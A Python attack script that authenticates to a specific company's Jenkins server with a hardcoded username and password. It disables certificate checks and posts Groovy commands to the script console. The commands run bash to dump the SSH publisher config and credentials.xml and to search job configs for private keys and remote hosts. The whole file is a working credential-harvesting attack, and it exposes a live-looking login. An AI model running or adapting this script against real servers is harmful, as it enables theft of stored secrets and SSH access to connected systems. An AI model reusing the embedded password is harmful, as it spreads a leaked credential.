import requests, urllib3
urllib3.disable_warnings()

BASE = "https://jenkins-ng.dev.claroshop.com"
USER = "eduardo.cruz"
PASS = "xwMyIxfkZZaDNkFg"

s = requests.Session()
s.auth = (USER, PASS)
s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"

crumb_url = f"{BASE}/crumbIssuer/api/json"
r = s.get(crumb_url, timeout=20)
r.raise_for_status()
crumb_data = r.json()
crumb_field = crumb_data["crumbRequestField"]
crumb_value = crumb_data["crumb"]
s.headers[crumb_field] = crumb_value
print(f"[+] Crumb: {crumb_field}={crumb_value[:20]}...")

SCRIPT_1 = '''
def r = ["bash","-c","cat /var/jenkins_home/jenkins.plugins.publish_over_ssh.BapSshPublisherPlugin.xml 2>/dev/null"].execute().text
println "=== SSH PUBLISHER CONFIG ==="
println r
'''

SCRIPT_2 = '''
def r2 = ["bash","-c","find /var/jenkins_home -name '*.xml' -path '*credentials*' 2>/dev/null | head -10"].execute().text
println "=== CREDENTIALS XML FILES ==="
println r2
def r3 = ["bash","-c","cat /var/jenkins_home/credentials.xml 2>/dev/null"].execute().text
println "=== CREDENTIALS XML CONTENT ==="
println r3
'''

SCRIPT_3 = '''
def r = ["bash","-c","find /var/jenkins_home -name 'config.xml' -path '*jobs*' 2>/dev/null | head -10"].execute().text
println "=== JOB CONFIG FILES ==="
println r
'''

SCRIPT_4 = '''
def r = ["bash","-c","grep -rl 'sshCredentials\\\\|remoteHost\\\\|privateKey\\\\|SSH' /var/jenkins_home/jobs/*/config.xml 2>/dev/null | head -20"].execute().text
println "=== SSH JOB CONFIGS ==="
println r
'''

SCRIPTS = [
    ("SSH Publisher Plugin XML", SCRIPT_1),
    ("Credentials XML", SCRIPT_2),
    ("Job config files", SCRIPT_3),
    ("SSH job configs", SCRIPT_4),
]

run_url = f"{BASE}/scriptText"

for label, script in SCRIPTS:
    print(f"\n{'='*60}")
    print(f"[*] Running: {label}")
    print('='*60)
    resp = s.post(run_url, data={"script": script}, timeout=60)
    print(f"[+] Status: {resp.status_code} | Length: {len(resp.text)}")
    print(resp.text)
